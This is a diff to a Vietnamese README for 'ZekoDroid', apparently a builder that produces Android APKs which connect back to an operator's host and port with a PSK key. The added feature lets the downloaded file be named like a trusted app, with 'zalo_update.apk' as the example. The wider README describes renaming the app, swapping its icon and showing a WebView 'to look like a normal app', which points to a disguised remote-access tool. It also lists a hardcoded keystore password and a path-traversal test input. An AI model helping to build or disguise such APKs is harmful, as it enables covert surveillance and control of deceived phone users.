@@ -36,6 +36,7 @@ Không cần JDK, apksigner, zipalign hay Android SDK trên VPS.
 | **tên app** | tên hiện trên launcher — patch thẳng string pool trong `resources.arsc` |
 | **home page** | URL app mở khi khởi động (WebView) để trông như app thường; để trống = mở màn hình cài đặt |
 | **psk** | khoá mã hoá (dán từ `/etc/zekodroid.env`) |
+| **tên file apk** | tên file tải về, vd `zalo_update` → `zalo_update.apk`; để trống = `ZekoDroid-<ip>.apk` |
 | **icon** | PNG thay icon |
 
 ### Đổi tên app thế nào (arsc patch)
@@ -52,7 +53,7 @@ Kiểm chứng: `aapt2 dump badging` → `application-label:'Cloud Sync'`, `apks
 
 ```
 GET  /api/builder/info                 → {ready, basePath}
-POST /api/builder/build  {url | host+port, name?, home?, psk?, icon?}
+POST /api/builder/build  {url | host+port, name?, home?, psk?, icon?, filename?}
      → APK (application/vnd.android.package-archive)
 ```
 
@@ -86,3 +87,15 @@ assets/zk.conf trong APK tải về:
 - Icon thì đổi được (thay `res/drawable/ic_launcher.png`).
 - APK chỉ ký v2 → máy Android < 7 không cài được.
 - Keystore nằm ở `server/builder/zeko.pfx` (pass `zeko123`) — giữ file này để update đè lên bản cũ.
+## Đặt tên file APK
+
+Ô **tên file apk** trong Builder (hoặc field `filename` khi gọi API):
+
+| Nhập | File tải về |
+|---|---|
+| (để trống) | `ZekoDroid-1_2_3_4.apk` |
+| `Cloud Sync v2.apk` | `Cloud_Sync_v2.apk` |
+| `zalo_update` | `zalo_update.apk` (tự thêm đuôi) |
+| `../etc/pa ss/evil` | `etc_pa_ss_evil.apk` (bị sanitize, không traversal) |
+
+Chỉ giữ `[A-Za-z0-9._-]`, ký tự khác đổi thành `_`, cắt 64 ký tự, luôn kết thúc bằng `.apk`.
